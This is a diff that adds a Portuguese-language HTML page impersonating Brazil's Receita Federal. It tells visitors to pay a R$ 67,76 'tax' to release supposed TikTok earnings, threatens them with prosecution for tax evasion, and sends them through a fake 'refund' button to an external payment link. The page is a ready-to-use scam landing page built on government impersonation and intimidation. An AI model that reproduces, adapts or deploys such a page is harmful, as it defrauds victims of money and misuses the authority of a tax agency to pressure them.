@@ -1,0 +1,89 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviso importante da Receita Federal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #002969; /* Novo fundo azul */
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 2px 2px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            background-color: #002969; /* Fundo igual ao fundo da página */
+            color: #fff; /* Texto branco */
+            position: relative;
+        }
+        img {
+            max-width: 50%; /* Reduzir a largura da imagem para 50% */
+            height: auto;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 37px; /* Fonte de tamanho 37px */
+            margin-bottom: 20px;
+            color: #FF0000; /* Cor vermelho vivo e forte */
+        }
+        .note {
+            font-size: 24px;
+            background-color: #002969; /* Fundo igual ao fundo da página */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            color: #fff; /* Texto branco */
+        }
+        button {
+            font-size: 18px;
+            padding: 15px;
+            margin-top: 20px;
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Imagem da Receita Federal -->
+        <img src="images/i489961.jpeg" alt="Receita Federal">
+        
+        <!-- Título atualizado com cor vermelho vivo -->
+        <h2>Aviso importante da Receita Federal</h2>
+
+        <div class="note">
+            <p><strong>Após o pagamento da taxa de R$ 67,76, referente ao valor do seu ganho no site do TikTok, você receberá o saldo correspondente. No entanto, caso não efetue o pagamento dessa taxa, estará sujeito ao risco de ser responsabilizado por sonegação fiscal.</strong></p>
+        </div>
+
+        <form id="refundForm">
+            <!-- Texto do botão atualizado para o novo link -->
+            <button type="submit">Preencher dados para o reembolso</button>
+        </form>
+    </div>
+    
+    <script>
+        document.getElementById("refundForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            window.location.href = "https://go.tribopay.com.br/9fv3utkr2u"; // Novo link de redirecionamento
+        });
+    </script>
+
+
+</body></html>
